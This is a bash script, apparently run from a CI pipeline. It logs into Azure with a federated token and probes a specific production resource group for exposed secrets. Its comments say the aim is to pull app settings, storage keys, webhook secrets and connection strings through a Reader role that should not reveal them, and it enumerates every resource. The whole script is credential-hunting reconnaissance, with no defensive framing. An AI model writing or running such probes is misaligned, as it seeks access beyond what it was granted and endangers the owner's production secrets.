#!/usr/bin/env bash
set -x

az login --federated-token "$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)" \
  --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --output none 2>&1 || true
az account set -s "$AZURE_SUBSCRIPTION_ID" 2>&1 || true

# Reader CAN read resource properties via GET
# App Service GET returns siteConfig which MAY include appSettings in some API versions

echo "=== APP SERVICE FULL GET (siteConfig with appSettings?) ==="
az rest --method get \
  --url "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2023-12-01" \
  --query "properties.siteConfig" 2>&1 | head -c 2000

echo "=== APP SERVICE CONFIG WEB (GET, not list) ==="
az rest --method get \
  --url "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/web?api-version=2023-12-01" 2>&1 | head -c 2000

# Storage account properties (might include keys in some edge cases)
echo "=== STORAGE ACCOUNT PROPERTIES ==="
az storage account show -n sttblappcfgprodx3euoz -g rg-tbl-platform-prod-sea --query "{name:name, kind:kind, accessTier:properties.accessTier, allowBlobPublicAccess:properties.allowBlobPublicAccess, allowSharedKeyAccess:properties.allowSharedKeyAccess, encryption:properties.encryption, networkAcls:properties.networkAcls.defaultAction, primaryEndpoints:properties.primaryEndpoints}" 2>&1

# Check ACR for webhooks that might contain secrets
echo "=== ACR WEBHOOKS ==="
az rest --method get \
  --url "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/webhooks?api-version=2023-07-01" 2>&1 | head -c 1000

# Check diagnostic settings on storage (might reference a storage account with connection string)
echo "=== DIAGNOSTIC SETTINGS (all resources) ==="
for RES in "Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz" "Microsoft.Web/sites/app-tbl-storefront-prod" "Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz"; do
  echo "--- $RES ---"
  az rest --method get \
    --url "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/$RES/providers/Microsoft.Insights/diagnosticSettings?api-version=2021-05-01-preview" 2>&1 | head -c 500
  echo
done

# Check Azure Automation accounts, Logic Apps, or other compute that might have connection strings
echo "=== ALL RESOURCE TYPES ==="
az resource list -g rg-tbl-platform-prod-sea --query "[].{name:name, type:type}" -o table 2>&1

echo "=== DONE ==="
